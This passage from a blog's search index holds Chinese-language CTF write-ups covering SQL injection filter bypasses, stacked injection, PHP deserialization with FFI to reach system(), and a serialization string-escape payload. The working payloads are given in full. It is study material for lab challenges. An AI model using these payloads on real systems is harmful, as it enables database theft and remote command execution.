    <content><![CDATA[<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p>SQL查询，过滤了：union、sleep、’、”、or、-、benchmark</p>
<p>order by测试字段数，发现当order by 2时返回正常order by 3返回没有这个字段，确定为两个字段，一个为uniqueid另一个应该就是flag</p>
<p>输入id判断登录，即可，尝试万能密码登录：1 || 1&#x3D;1 limit 0,1<br>返回flag</p>
<p><img src="/2022/12/26/%E7%AC%94%E8%AE%B0/13.jpg" alt="题图"></p>
<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>1.输入1，看到有回显<code>Array ( [0] =&gt; 1 )</code>，输入<code>1#</code>有回显，但是输入<code>1&#39;</code>和<code>1&#39;#</code>都没有回显，连报错都没有，就说明不能使用报错注入，而且<code>&quot;</code>被过滤了</p>
<p>2.而且输入<code>and,or,union,if,order,from,sleep等</code>都会显示Nonono，说明都被过滤了，不能使用联合注入、时间盲注、布尔盲注</p>
<p>3.最后发现可以使用堆叠注入</p>
<p>先使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</span><br></pre></td></tr></table></figure>

<p>再使用payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables#</span><br><span class="line"></span><br><span class="line">回显</span><br><span class="line">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</span><br></pre></td></tr></table></figure>

<p>这就说明有一个flag表，但from没法使用不能打开表中的列，而且hendler也被过滤</p>
<p>4.然后wp上有一个知识点，如果打开<code>set sql_mode=pipes_as_concat</code>模式，则||运算符用作字符串连接</p>
<p>比如一般select 6||1会返回1，但如果打开这个模式，就会返回61，因为直接被当作字符串来连接起来了</p>
<p>5.然后wp上猜测的是这个原语句是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>所以就会有两种方法</p>
<p>方法一payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*,1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>

<p>方法二payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=pipes_as_concat;select 1</span><br><span class="line"></span><br><span class="line">这就相当于执行了</span><br><span class="line">select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag;</span><br><span class="line">因为打开了这个模式，所以1||flag会被当成1和flag，而不会进行运算</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Nextphp</title>
    <url>/2022/12/26/nextphp/</url>
    <content><![CDATA[<h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p>1.源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看phpinfo（）</p>
<p>发现很多禁用的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl	</span><br></pre></td></tr></table></figure>

<p>使用file_put_contents()写入一个a.php</p>
<p>yijian连接获取源代码preload.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;print_r&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;1&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        </span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">	//结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察到有反序列化，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &#x27;ret&#x27; =&gt; null,</span><br><span class="line">        &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;,</span><br><span class="line">        &#x27;arg&#x27; =&gt; &#x27;int system(char *command);&#x27;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    //可以进行函数执行</span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        //array_merge把两个数组合并为一个数组</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line"></span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    //结果输出</span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        //如果$key为ret，就可以输出函数执行返回的结果</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line">/*</span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#x27;No implemented&#x27;);</span><br><span class="line">    &#125;*/</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>传入<code>$a</code>之后，进行unserialize反序列化，会找__unserialize()函数，然后执行run()函数，然后data[‘ret’]&#x3D;FFI::cdef(‘int system(char *command);’)，然后使用从C库中加载的system函数，然后return，最后执行system(‘cat &#x2F;flag | tee a.txt’)，使用tee保存cat &#x2F;flag的结果</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=$a=unserialize(&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;)-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag | tee a.txt&#x27;);</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>反序列化逃逸</title>
    <url>/2023/01/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>1.源代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@0@&#x27;</span>, <span class="string">&#x27;a*a&#x27;</span>, <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserAccount</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">object_weakup</span>(<span class="title function_ invoke__">object_sleep</span>(<span class="variable">$user</span>))));</span><br></pre></td></tr></table></figure>

<p>2.ctfhub{nginx_php_56} bool(false)</p>
<p>题目中有eval函数，那么直接在eval上写</p>
<p>‘system(“cat &#x2F;flag”);’</p>
<p>3.因为要进行一次序列化，如果我们输入的是字符串就不会再进行</p>
<p>序列化，可以把输入语句变为可控的</p>
<p>直接对order进行序列化</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>=<span class="string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> order;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>5.对serialize username,password的字符内容进行测试</p>
<p>我们应该使用username的s:来吞噬掉后面的字符串从而使</p>
<p><strong>O:5:”order”:2:{s:1:”f”;s:20:”system(“cat &#x2F;flag”);”;s:4:”hint”;N;}<strong>被当作object来解析，则需要减少的方法</strong>object_weakup($ob)</strong></p>
<p>6.计算（<strong>总共要吞噬掉27字符</strong>）</p>
<p>以”    “开始和闭合</p>
<p>一次减少6个，则进行五次，在后边补充三个字符并以”闭合</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@@0@0@0@0@&amp;password=aaa&quot;;s:11:&quot; * password&quot;;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:20:&quot;system(&quot;cat+/flag&quot;);&quot;;s:4:&quot;hint&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%5C333.jpg" alt="lll"></p>
]]></content>
  </entry>
</search>
